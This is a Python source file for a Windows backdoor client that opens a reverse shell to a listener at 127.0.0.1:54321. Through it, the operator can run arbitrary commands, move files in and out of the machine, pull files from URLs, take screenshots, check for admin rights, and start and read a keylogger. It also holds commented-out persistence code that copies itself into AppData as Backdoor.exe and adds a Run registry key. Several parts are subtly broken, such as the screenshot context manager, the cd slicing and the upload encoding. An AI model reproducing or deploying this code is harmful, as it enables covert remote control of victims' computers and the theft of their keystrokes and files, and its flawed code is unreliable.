import json
import socket
import subprocess
import os
import sys
import shutil
import time
import base64
import requests
import ctypes
import threading
from mss import mss

import keylogger

admin = None


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(bytes(json_data, 'utf-8'))


def reliable_recv():
    json_data = ""
    while True:
        try:
            data = s.recv(1024)
            json_data = json_data + data.decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue


def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join(
            [os.environ.get('SystemRoot', 'C:\Windows'), 'temp']))
    except:
        admin = "[!!] User privileges"
    else:
        admin = "[+] Administrator privileges"


def screenshot():
    with mss() as screenshot():
        screenshot.shot()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(("127.0.0.1", 54321))
            shell()
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            try:
                os.remove(keylogger_path)
            except:
                continue
            break
        elif command[:4] == "help":
            help_options = '''
                            download [path] -> Download a File from target PC
                            upload [path]   -> Download a File to target PC
                            get [url]       -> Download a File into target from the URL
                            start [path]    -> Start a program in target PC
                            screenshot      -> Take a screenshot of Target PC Screen
                            check_admin     -> Check if the User has Administrator Privileges
                            keylog_start    -> Start a keylogger on target PC
                            keylog_dump     -> Print the contents of the keylogger
                            q               -> Exit the Reverse Shell
                            '''
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[:3])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                result = reliable_recv()
                fin.write(base64.b64encode(result))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded files from specified URL")
            except:
                reliable_send("[!!] Failed to download the file")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started")
            except:
                reliable_send("[!!] Failed to send")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take a screenshot")
        elif command[:11] == "check_admin":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("[!] Can't perform the check")
        elif command[:12] == "keylog_start":
            thread1 = threading.Thread(target=keylogger.start)
            thread1.start()
        elif command[:11] == "keylog_dump":
            fn = open(keylogger_path, "r")
            reliable_send(fn.read())
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result)
            except:
                reliable_send("[!!] Can't Execute the command")


# keylogger_path = os.environ['appdata'] + "\\keylogger.txt"
keylogger_path = "keylogger.txt"
location = os.environ['appdata'] + "\\Backdoor.exe"
if not os.path.exists(location):
    pass
    # Uncomment the below code to copy the file to ....\AppData\Roaming Directory
    # shutil.copyfile(sys.executable, location)
    # Uncomment the below code to create a startup key
    # subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "{location}"', shell=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
shell()
s.close()
